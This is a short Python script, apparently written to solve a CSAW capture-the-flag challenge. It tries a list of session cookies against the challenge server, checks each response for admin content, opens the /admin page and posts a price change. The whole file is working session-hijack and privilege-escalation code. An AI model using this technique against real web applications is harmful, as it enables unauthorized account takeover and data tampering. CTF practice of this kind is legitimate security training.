#!/usr/bin/env python3
import requests
import sys
import time

TARGET_URL = "http://rev.chal.csaw.io:5800"

def test_cookie(cookie):
    try:
        headers = {"Cookie": f"session={cookie}"}
        response = requests.get(TARGET_URL, headers=headers)

        # Look for admin-related content
        if any(keyword in response.text.lower() for keyword in ['admin', 'privilege', 'dashboard', 'control']):
            print(f"[+] Potentially successful cookie found: {cookie}")
            print(f"Response: {response.text[:200]}...")

            # Try to access admin functionality
            admin_response = requests.get(f"{TARGET_URL}/admin", headers=headers)
            if admin_response.status_code == 200:
                print(f"[!] Admin access successful!")
                print(f"Admin Response: {admin_response.text}")

                # Try to change the price
                price_data = {"new_price": "2.75"}
                change_price = requests.post(f"{TARGET_URL}/change_price", headers=headers, data=price_data)
                if change_price.status_code == 200:
                    print(f"[!!!] Price change attempt response: {change_price.text}")

            return True
        return False
    except Exception as e:
        print(f"Error testing cookie {cookie}: {str(e)}")
        return False

def main():
    with open("cookies.txt", "r") as f:
        cookies = [line.strip().split("Cookie: ")[1] for line in f if line.strip()]

    print(f"[*] Testing {len(cookies)} different cookie combinations...")

    for cookie in cookies:
        print(f"[-] Testing cookie: {cookie[:30]}...")
        if test_cookie(cookie):
            print("\n[+] Stopping test as potential success found")
            break
        time.sleep(0.5)  # Rate limiting to be nice to the server

if __name__ == "__main__":
    main()

